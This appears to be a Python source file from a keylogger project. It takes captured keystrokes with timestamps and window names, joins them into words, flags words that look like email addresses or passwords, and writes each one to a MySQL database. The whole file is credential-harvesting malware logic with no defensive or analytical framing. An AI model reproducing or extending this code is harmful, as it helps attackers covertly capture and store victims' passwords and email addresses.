from load_config import load_cfg
import mysql.connector

class Process:
    def __init__(self):
        self.word = ""
        self.payload = {
            "datetime": "",
            "epoch": "",
            "windowName": "",
            "processedWord":"",
            "isEmail": 0,
            "isPassword": 0
        }
    
    
    def separateBreakChar(self,data):
    #loop through items in log and append characters on key-down
        if (data['processedKey']):
            if (len(self.word) == 0):
                self.payload['datetime'] = data['datetime']
                self.payload['epoch'] = data['epochTime']
                self.payload['windowName'] = data['windowName']
            self.word += data['processedKey']
        else:
            print("words: "+ self.payload['processedWord'])
            self.payload['processedWord'] = self.word
            self.word = ""
            self.checkEmailPassword()
            self.pushDB()
        return 0
                
    def checkEmailPassword(self):
    #check the processedWord of the payload to determine if possible email or password
        word = self.payload['processedWord']
        if "@" in word:
            self.payload['isEmail'] = 1
        
        elif (not word.isalpha() and not word.isdigit()):
            #a high level filtering for words which are a mix of alphabet and digits, suggesting they are possible passwords
            self.payload['isPassword'] = 1
            
    
    def pushDB(self):
    #push to table words
        main_cfg = load_cfg('./main_cfg.json')
        
        db = mysql.connector.connect (
            host=main_cfg['dbHost'],
            port=main_cfg['port'],
            user=main_cfg['sqlUser'],
            password=main_cfg['sqlPass'],
            database=main_cfg['db']
        )
        mycursor = db.cursor()

        sql = f"INSERT INTO {main_cfg['dbWordTable']} {main_cfg['dbWordRows']} VALUES (%s, %s, %s, %s, %s, %s)"
        val = (f"{self.payload['datetime']}", f"{self.payload['epoch']}", f"{self.payload['windowName']}", f"{self.payload['processedWord']}",f"{self.payload['isEmail']}", f"{self.payload['isPassword']}")
        
        print(sql,val)
        
        mycursor.execute(sql, val)
        db.commit()
        
        self.payload['processedWord'] = ""
        mycursor.close()
        db.close()
        
        return 0 
    
